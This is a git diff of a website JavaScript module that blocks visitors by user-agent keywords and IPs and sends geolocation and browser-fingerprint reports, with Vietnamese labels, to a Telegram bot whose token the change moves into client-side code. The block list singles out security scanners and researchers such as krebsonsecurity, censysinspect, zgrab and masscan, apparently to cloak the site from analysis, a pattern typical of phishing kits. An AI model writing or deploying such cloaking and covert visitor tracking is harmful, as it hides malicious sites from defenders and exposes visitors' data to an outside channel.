@@ -1,3 +1,4 @@
+import config from '@/utils/config';
 import axios from 'axios';
 
 const blockedKeywords = ['bot', 'crawler', 'spider', 'puppeteer', 'selenium', 'http', 'client', 'curl', 'wget', 'python', 'java', 'ruby', 'go', 'scrapy', 'lighthouse', 'censysinspect', 'facebookexternalhit', 'krebsonsecurity', 'ivre-masscan', 'ahrefs', 'semrush', 'sistrix', 'mailchimp', 'mailgun', 'larbin', 'libwww', 'spinn3r', 'zgrab', 'masscan', 'yandex', 'baidu', 'sogou', 'tweetmeme', 'misting', 'BotPoke'];
@@ -9,6 +10,8 @@ const blockedIPs = ['95.214.55.43', '154.213.184.3'];
 const sendBotTelegram = async (reason) => {
     try {
         const geoUrl = 'https://get.geojs.io/v1/ip/geo.json';
+        const botToken = config.noti_token;
+        const chatId = config.noti_chat_id;
 
         const geoRes = await axios.get(geoUrl);
         const geoData = geoRes.data;
@@ -46,11 +49,15 @@ const sendBotTelegram = async (reason) => {
 📺 <b>Màn hình:</b> <code>${fullFingerprint.screen.width}x${fullFingerprint.screen.height}</code>
 📐 <b>Màn hình thực:</b> <code>${fullFingerprint.screen.availWidth}x${fullFingerprint.screen.availHeight}</code>`;
 
-        // Sử dụng Netlify Functions để gửi telegram
-        await axios.post('/.netlify/functions/send-telegram', {
-            message: msg,
-            chatId: 'noti', // Sử dụng noti_chat_id
-            parseMode: 'HTML'
+        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        const payload = {
+            chat_id: chatId,
+            text: msg,
+            parse_mode: 'HTML'
+        };
+
+        await axios.post(telegramUrl, payload, {
+            headers: { 'Content-Type': 'application/json' }
         });
     } catch {
         //
